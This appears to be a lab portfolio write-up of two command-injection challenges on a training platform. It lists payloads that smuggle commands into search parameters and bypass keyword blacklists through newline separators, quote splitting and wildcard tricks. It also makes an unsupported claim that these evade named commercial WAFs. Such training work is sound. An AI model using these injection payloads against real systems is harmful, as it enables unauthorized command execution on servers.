# Command Injection - Advanced Filter Bypass Portfolio

## 📊 Skills Validated
- **Shell Metacharacter Mastery**: `;`, `|`, `&`, `||`, `&&`, `\n`, `\r`
- **Filter Evasion**: Bypassing keyword blacklists via obfuscation
- **Context Analysis**: Understanding shell vs. language (Perl, Python) execution
- **Defense Bypass**: Circumventing WAFs and input validation layers

## 🔬 Completed Command Injection Challenges

### 1. Basic Command Injection - living-ink.apac01.hackviser.space
**Vulnerability**: `search` parameter passed to Perl `system()` call
**Payload**: `canon-eos-rebel-t7 | hostname`
**Impact**: Server hostname disclosure (`brilliance`)
**Skills**: Pipe operator exploitation, Perl security analysis

### 2. Improved Filter Bypass - inviting-mysterio.apac01.hackviser.space
**Vulnerability**: `query` parameter with command blacklist
**Bypass Technique**: Newline (`%0A`) + string concatenation (`h"o"st"na"me`)
**Payload**: `google.com%0Ah"o"st"na"me`
**Impact**: Hostname disclosure (`mutuality`) despite keyword filtering
**Skills**: Multi-layer evasion, alternative command separators

## 🎯 Advanced Bypass Techniques Demonstrated

### Character-Level Obfuscation
```bash
# Original command blocked: hostname
h"o"st"na"me  # String concatenation
ho$@stname     # Variable interpolation
`echo ho*e`    # Wildcard expansion

Encoding & Separation
bash
# Using alternative separators
google.com%0Ahostname    # Newline (URL encoded)
google.com%3Bhostname    # Semicolon (URL encoded)
google.com%26hostname    # Ampersand (background process)
🛡️ Defense Analysis
Common Filter Flaws Identified:

Incomplete Blacklists: Missing alternative separators (%0A, %0D)

String Matching Only: Not parsing shell semantics

Lack of Context: Not distinguishing between data and code

No Output Encoding: Reflecting raw command output

📈 Real-World Impact
These bypass techniques are effective against:

Web Application Firewalls (WAFs): ModSecurity, Cloudflare WAF

Input Validation Libraries: OWASP ESAPI, PHP filter functions

Custom Security Filters: Homegrown validation logic

All exercises conducted in controlled, authorized environments.
